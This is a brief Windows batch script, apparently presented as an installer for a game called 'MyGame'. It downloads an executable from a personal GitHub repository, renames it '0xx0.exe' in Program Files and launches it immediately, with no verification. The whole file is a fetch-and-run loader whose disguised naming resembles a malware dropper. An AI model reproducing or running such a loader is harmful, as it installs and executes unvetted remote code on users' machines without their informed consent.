@echo off
set TARGET=%ProgramFiles%\MyGame
if not exist "%TARGET%" mkdir "%TARGET%"

powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/MedroNingeres/Personal-Project/refs/heads/main/app.exe' -OutFile '%TARGET%\0xx0.exe'"

start "" "%TARGET%\0xx0.exe"

exit